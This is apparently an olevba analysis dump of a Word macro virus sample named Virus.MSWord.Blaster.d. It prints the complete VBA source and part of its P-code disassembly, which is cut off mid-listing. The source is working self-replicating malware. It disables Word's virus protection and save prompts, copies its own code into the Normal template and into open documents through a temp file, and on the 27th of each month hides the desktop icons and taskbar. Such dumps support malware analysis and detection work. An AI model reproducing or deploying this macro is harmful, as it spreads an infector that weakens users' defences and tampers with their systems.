olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Blaster.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Blaster.d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit
Const SW_HIDE = 0
Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Private Declare Function GetDesktopWindow Lib "User32.dll" () As Long
Private Declare Function GetWindow Lib "user32" (ByVal hwnd As Long, ByVal wCmd As Long) As Long
Private Declare Function ShowWindow Lib "User32.dll" (ByVal hwnd As Long, ByVal nCmdShow As Long) As Long
Private Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Long, ByVal uParam As Long, ByVal lpvParam As Any, ByVal fuWinIni As Long) As Long
Private Sub Document_Close()
    Dim stato As Boolean
    Dim flagaltro As Boolean
    Dim flagio As Boolean
    Dim count As Integer
    Dim stress As String
    Dim bry As Variant
    Dim hWnd_DesktopIcons As Long
    Dim hWnd_StartBar As Long
    Dim X As Long
    
    On Error Resume Next
    stato = ActiveDocument.Saved

    Application.EnableCancelKey = Not -1
    With Options
        .ConfirmConversions = 0
        .VirusProtection = 0
        .SaveNormalPrompt = 0
    End With
        SetAttr "c:\cont.dbl", vbNormal: Kill "c:\cont.dbl": Open "c:\cont.dbl" For Output As #1
    For count = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
        If MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(count, 1) = "Option Explicit" Then Exit For
    Next count
    
    Do Until MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(count, 1) = "End Sub"
        Print #1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(count, 1)
        count = count + 1
    Loop
    
    Print #1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(count, 1)
    
    For count = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
        If MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(count, 1) = "Private Sub Document_Open()" Then Exit For
    Next count
    
    Do Until MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(count, 1) = "End Sub"
        Print #1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(count, 1)
        count = count + 1
    Loop
    
    Print #1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(count, 1)
    Close #1
        
    SetAttr "c:\cont.dbl", vbNormal

    flagaltro = False
    flagio = False
    
    Set bry = NormalTemplate.VBProject.VBComponents.Item(1)
    
    For count = 1 To bry.CodeModule.CountOfLines
        If bry.CodeModule.Lines(count, 1) = "Private Sub Document_Close()" Then
            flagaltro = True
            flagio = False
            If Trim(bry.CodeModule.Lines(count + 1, 1)) = "Dim stato As Boolean" Then
                flagio = True
                flagaltro = False
                Exit For
            End If
        End If
    Next count
    
    If flagaltro = True Then
        For count = 1 To bry.CodeModule.CountOfLines
            If bry.CodeModule.Lines(count, 1) = "Option Explicit" Then Exit For
        Next count
    
        Do Until bry.CodeModule.Lines(count, 1) = "End Sub"
            bry.CodeModule.DeleteLines (count)
        Loop
        
        bry.CodeModule.DeleteLines (count)
        
        flagaltro = False
    End If
    
    If flagio = False And flagaltro = False Then
        Open "c:\cont.dbl" For Input As #1
        If LOF(1) = 0 Then GoTo cpynorm
        count = 1
        Do While Not EOF(1)
            Line Input #1, stress
            bry.CodeModule.InsertLines count, stress
            count = count + 1
        Loop
cpynorm:
        Close #1
    End If

    flagaltro = False
    flagio = False
    
    Set bry = ActiveDocument.VBProject.VBComponents.Item(1)
    
    For count = 1 To bry.CodeModule.CountOfLines
        If bry.CodeModule.Lines(count, 1) = "Private Sub Document_Close()" Then
            flagaltro = True
            flagio = False
            If Trim(bry.CodeModule.Lines(count + 1, 1)) = "Dim stato As Boolean" Then
                flagio = True
                flagaltro = False
                Exit For
            End If
        End If
    Next count
    
    If flagaltro = True Then
        For count = 1 To bry.CodeModule.CountOfLines
            If bry.CodeModule.Lines(count, 1) = "Option Explicit" Then Exit For
        Next count
   
        Do Until bry.CodeModule.Lines(count, 1) = "End Sub"
            bry.CodeModule.DeleteLines (count)
        Loop
        
        bry.CodeModule.DeleteLines (count)
        
        flagaltro = False
    End If
    
    If flagio = False And flagaltro = False Then
        Open "c:\cont.dbl" For Input As #1
        If LOF(1) = 0 Then GoTo cpyacti
        count = 1
        Do While Not EOF(1)
            Line Input #1, stress
            bry.CodeModule.InsertLines count, stress
            count = count + 1
        Loop
cpyacti:
        Close #1
    End If

    Kill "c:\cont.dbl"

    If Left(ActiveDocument.Name, 8) <> "Document" Then
        ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
    End If

    If Day(Date) = 27 Then
    X = SystemParametersInfo(97, True, CStr(1), 0)
    hWnd_DesktopIcons = GetWindow(FindWindow("Progman", "Program Manager"), 5)
    ShowWindow hWnd_DesktopIcons, SW_HIDE
    hWnd_StartBar = FindWindow("Shell_TrayWnd", "")
    ShowWindow hWnd_StartBar, SW_HIDE
    End If

    ActiveDocument.Saved = stato
    
    On Error GoTo 0
End Sub
Private Sub Document_Open()
    Dim flagaltro As Boolean
    Dim flagio As Boolean
    Dim count As Integer
    Dim bry As Variant
    
    On Error Resume Next

    Application.EnableCancelKey = Not -1
    With Options
        .ConfirmConversions = 0
        .VirusProtection = 0
        .SaveNormalPrompt = 0
    End With

    flagaltro = False
    flagio = False
    
    Set bry = NormalTemplate.VBProject.VBComponents.Item(1)
    
    For count = 1 To bry.CodeModule.CountOfLines
        If bry.CodeModule.Lines(count, 1) = "Private Sub Document_Close()" Then
            flagaltro = True
            flagio = False
            If Trim(bry.CodeModule.Lines(count + 1, 1)) = "Dim stato As Boolean" Then
                flagio = True
                flagaltro = False
                Exit For
            End If
        End If
    Next count
    
    If flagaltro = True Then
        For count = 1 To bry.CodeModule.CountOfLines
            If bry.CodeModule.Lines(count, 1) = "Option Explicit" Then Exit For
        Next count
    
        Do Until bry.CodeModule.Lines(count, 1) = "End Sub"
            bry.CodeModule.DeleteLines (count)
        Loop
        
        bry.CodeModule.DeleteLines (count)
        
        flagaltro = False
    End If
    
    flagaltro = False
    flagio = False
    
    Set bry = NormalTemplate.VBProject.VBComponents.Item(1)
    
    For count = 1 To bry.CodeModule.CountOfLines
        If bry.CodeModule.Lines(count, 1) = "Private Sub Document_Open()" Then
            flagaltro = True
            flagio = False
            If Trim(bry.CodeModule.Lines(count + 1, 1)) = "Dim flagaltro As Boolean" Then
                flagio = True
                flagaltro = False
                Exit For
            End If
        End If
    Next count
    
    If flagaltro = True Then
        For count = 1 To bry.CodeModule.CountOfLines
            If bry.CodeModule.Lines(count, 1) = "Private Sub Document_Open()" Then Exit For
        Next count
    
        Do Until bry.CodeModule.Lines(count, 1) = "End Sub"
            bry.CodeModule.DeleteLines (count)
        Loop
        
        bry.CodeModule.DeleteLines (count)
        
        flagaltro = False
    End If

    On Error GoTo 0
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Blaster.d
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 11732 bytes
' Line #0:
' 	Option  (Explicit)
' Line #1:
' 	Dim (Const) 
' 	LitDI2 0x0000 
' 	VarDefn SW_HIDE
' Line #2:
' 	FuncDefn (Private Declare Function FindWindow Lib "user32" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long)
' Line #3:
' 	FuncDefn (Private Declare Function GetDesktopWindow Lib "User32.dll" () As Long)
' Line #4:
' 	FuncDefn (Private Declare Function GetWindow Lib "user32" (ByVal hwnd As Long, ByVal wCmd As Long) As Long)
' Line #5:
' 	FuncDefn (Private Declare Function ShowWindow Lib "User32.dll" (ByVal hwnd As Long, ByVal nCmdShow As Long) As Long)
' Line #6:
' 	FuncDefn (Private Declare Function SystemParametersInfo Lib "user32" (ByVal uAction As Long, ByVal uParam As Long, ByVal lpvParam As , ByVal fuWinIni As Long) As Long)
' Line #7:
' 	FuncDefn (Private Sub Document_Close())
' Line #8:
' 	Dim 
' 	VarDefn stato (As Boolean)
' Line #9:
' 	Dim 
' 	VarDefn flagaltro (As Boolean)
' Line #10:
' 	Dim 
' 	VarDefn flagio (As Boolean)
' Line #11:
' 	Dim 
' 	VarDefn count (As Integer)
' Line #12:
' 	Dim 
' 	VarDefn stress (As String)
' Line #13:
' 	Dim 
' 	VarDefn bry (As Variant)
' Line #14:
' 	Dim 
' 	VarDefn hWnd_DesktopIcons (As Long)
' Line #15:
' 	Dim 
' 	VarDefn hWnd_StartBar (As Long)
' Line #16:
' 	Dim 
' 	VarDefn X (As Long)
' Line #17:
' Line #18:
' 	OnError (Resume Next) 
' Line #19:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St stato 
' Line #20:
' Line #21:
' 	LitDI2 0x0001 
' 	UMi 
' 	Not 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #22:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #23:
' 	LitDI2 0x0000 
' 	MemStWith ConfirmConversions 
' Line #24:
' 	LitDI2 0x0000 
' 	MemStWith VirusProtection 
' Line #25:
' 	LitDI2 0x0000 
' 	MemStWith SaveNormalPrompt 
' Line #26:
' 	EndWith 
' Line #27:
' 	LitStr 0x000B "c:\cont.dbl"
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' 	BoS 0x0000 
' 	LitStr 0x000B "c:\cont.dbl"
' 	ArgsCall Kill 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x000B "c:\cont.dbl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #28:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #29:
' 	Ld count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000F "Option Explicit"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #30:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	NextVar 
' Line #31:
' Line #32:
' 	Ld count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0007 "End Sub"
' 	Eq 
' 	DoUnitil 
' Line #33:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	PrintItemNL 
' Line #34:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Add 
' 	St count 
' Line #35:
' 	Loop 
' Line #36:
' Line #37:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	PrintItemNL 
' Line #38:
' Line #39:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #40:
' 	Ld count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #41:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	NextVar 
' Line #42:
' Line #43:
' 	Ld count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0007 "End Sub"
' 	Eq 
' 	DoUnitil 
' Line #44:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	PrintItemNL 
' Line #45:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Add 
' 	St count 
' Line #46:
' 	Loop 
' Line #47:
' Line #48:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	PrintItemNL 
' Line #49:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #50:
' Line #51:
' 	LitStr 0x000B "c:\cont.dbl"
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #52:
' Line #53:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #54:
' 	LitVarSpecial (False)
' 	St flagio 
' Line #55:
' Line #56:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set bry 
' Line #57:
' Line #58:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #59:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Eq 
' 	IfBlock 
' Line #60:
' 	LitVarSpecial (True)
' 	St flagaltro 
' Line #61:
' 	LitVarSpecial (False)
' 	St flagio 
' Line #62:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd Trim 0x0001 
' 	LitStr 0x0014 "Dim stato As Boolean"
' 	Eq 
' 	IfBlock 
' Line #63:
' 	LitVarSpecial (True)
' 	St flagio 
' Line #64:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #65:
' 	ExitFor 
' Line #66:
' 	EndIfBlock 
' Line #67:
' 	EndIfBlock 
' Line #68:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	NextVar 
' Line #69:
' Line #70:
' 	Ld flagaltro 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #71:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #72:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000F "Option Explicit"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #73:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	NextVar 
' Line #74:
' Line #75:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0007 "End Sub"
' 	Eq 
' 	DoUnitil 
' Line #76:
' 	Ld count 
' 	Paren 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #77:
' 	Loop 
' Line #78:
' Line #79:
' 	Ld count 
' 	Paren 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #80:
' Line #81:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #82:
' 	EndIfBlock 
' Line #83:
' Line #84:
' 	Ld flagio 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld flagaltro 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #85:
' 	LitStr 0x000B "c:\cont.dbl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #86:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo cpynorm 
' 	EndIf 
' Line #87:
' 	LitDI2 0x0001 
' 	St count 
' Line #88:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #89:
' 	LitDI2 0x0001 
' 	Ld stress 
' 	LineInput 
' Line #90:
' 	Ld count 
' 	Ld stress 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #91:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Add 
' 	St count 
' Line #92:
' 	Loop 
' Line #93:
' 	Label cpynorm 
' Line #94:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #95:
' 	EndIfBlock 
' Line #96:
' Line #97:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #98:
' 	LitVarSpecial (False)
' 	St flagio 
' Line #99:
' Line #100:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set bry 
' Line #101:
' Line #102:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #103:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Eq 
' 	IfBlock 
' Line #104:
' 	LitVarSpecial (True)
' 	St flagaltro 
' Line #105:
' 	LitVarSpecial (False)
' 	St flagio 
' Line #106:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd Trim 0x0001 
' 	LitStr 0x0014 "Dim stato As Boolean"
' 	Eq 
' 	IfBlock 
' Line #107:
' 	LitVarSpecial (True)
' 	St flagio 
' Line #108:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #109:
' 	ExitFor 
' Line #110:
' 	EndIfBlock 
' Line #111:
' 	EndIfBlock 
' Line #112:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	NextVar 
' Line #113:
' Line #114:
' 	Ld flagaltro 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #115:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #116:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000F "Option Explicit"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #117:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	NextVar 
' Line #118:
' Line #119:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0007 "End Sub"
' 	Eq 
' 	DoUnitil 
' Line #120:
' 	Ld count 
' 	Paren 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #121:
' 	Loop 
' Line #122:
' Line #123:
' 	Ld count 
' 	Paren 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #124:
' Line #125:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #126:
' 	EndIfBlock 
' Line #127:
' Line #128:
' 	Ld flagio 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld flagaltro 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #129:
' 	LitStr 0x000B "c:\cont.dbl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #130:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo cpyacti 
' 	EndIf 
' Line #131:
' 	LitDI2 0x0001 
' 	St count 
' Line #132:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #133:
' 	LitDI2 0x0001 
' 	Ld stress 
' 	LineInput 
' Line #134:
' 	Ld count 
' 	Ld stress 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #135:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Add 
' 	St count 
' Line #136:
' 	Loop 
' Line #137:
' 	Label cpyacti 
' Line #138:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #139:
' 	EndIfBlock 
' Line #140:
' Line #141:
' 	LitStr 0x000B "c:\cont.dbl"
' 	ArgsCall Kill 0x0001 
' Line #142:
' Line #143:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	IfBlock 
' Line #144:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #145:
' 	EndIfBlock 
' Line #146:
' Line #147:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001B 
' 	Eq 
' 	IfBlock 
' Line #148:
' 	LitDI2 0x0061 
' 	LitVarSpecial (True)
' 	LitDI2 0x0001 
' 	Coerce (Str) 
' 	LitDI2 0x0000 
' 	ArgsLd SystemParametersInfo 0x0004 
' 	St X 
' Line #149:
' 	LitStr 0x0007 "Progman"
' 	LitStr 0x000F "Program Manager"
' 	ArgsLd FindWindow 0x0002 
' 	LitDI2 0x0005 
' 	ArgsLd GetWindow 0x0002 
' 	St hWnd_DesktopIcons 
' Line #150:
' 	Ld hWnd_DesktopIcons 
' 	Ld SW_HIDE 
' 	ArgsCall ShowWindow 0x0002 
' Line #151:
' 	LitStr 0x000D "Shell_TrayWnd"
' 	LitStr 0x0000 ""
' 	ArgsLd FindWindow 0x0002 
' 	St hWnd_StartBar 
' Line #152:
' 	Ld hWnd_StartBar 
' 	Ld SW_HIDE 
' 	ArgsCall ShowWindow 0x0002 
' Line #153:
' 	EndIfBlock 
' Line #154:
' Line #155:
' 	Ld stato 
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #156:
' Line #157:
' 	OnError (GoTo 0) 
' Line #158:
' 	EndSub 
' Line #159:
' 	FuncDefn (Private Sub Document_Open())
' Line #160:
' 	Dim 
' 	VarDefn flagaltro (As Boolean)
' Line #161:
' 	Dim 
' 	VarDefn flagio (As Boolean)
' Line #162:
' 	Dim 
' 	VarDefn count (As Integer)
' Line #163:
' 	Dim 
' 	VarDefn bry (As Variant)
' Line #164:
' Line #165:
' 	OnError (Resume Next) 
' Line #166:
' Line #167:
' 	LitDI2 0x0001 
' 	UMi 
' 	Not 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #168:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #169:
' 	LitDI2 0x0000 
' 	MemStWith ConfirmConversions 
' Line #170:
' 	LitDI2 0x0000 
' 	MemStWith VirusProtection 
' Line #171:
' 	LitDI2 0x0000 
' 	MemStWith SaveNormalPrompt 
' Line #172:
' 	EndWith 
' Line #173:
' Line #174:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #175:
' 	LitVarSpecial (False)
' 	St flagio 
' Line #176:
' Line #177:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set bry 
' Line #178:
' Line #179:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #180:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Eq 
' 	IfBlock 
' Line #181:
' 	LitVarSpecial (True)
' 	St flagaltro 
' Line #182:
' 	LitVarSpecial (False)
' 	St flagio 
' Line #183:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd Trim 0x0001 
' 	LitStr 0x0014 "Dim stato As Boolean"
' 	Eq 
' 	IfBlock 
' Line #184:
' 	LitVarSpecial (True)
' 	St flagio 
' Line #185:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #186:
' 	ExitFor 
' Line #187:
' 	EndIfBlock 
' Line #188:
' 	EndIfBlock 
' Line #189:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	NextVar 
' Line #190:
' Line #191:
' 	Ld flagaltro 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #192:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #193:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000F "Option Explicit"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #194:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	NextVar 
' Line #195:
' Line #196:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0007 "End Sub"
' 	Eq 
' 	DoUnitil 
' Line #197:
' 	Ld count 
' 	Paren 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #198:
' 	Loop 
' Line #199:
' Line #200:
' 	Ld count 
' 	Paren 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #201:
' Line #202:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #203:
' 	EndIfBlock 
' Line #204:
' Line #205:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #206:
' 	LitVarSpecial (False)
' 	St flagio 
' Line #207:
' Line #208:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set bry 
' Line #209:
' Line #210:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #211:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	Eq 
' 	IfBlock 
' Line #212:
' 	LitVarSpecial (True)
' 	St flagaltro 
' Line #213:
' 	LitVarSpecial (False)
' 	St flagio 
' Line #214:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd Trim 0x0001 
' 	LitStr 0x0018 "Dim flagaltro As Boolean"
' 	Eq 
' 	IfBlock 
' Line #215:
' 	LitVarSpecial (True)
' 	St flagio 
' Line #216:
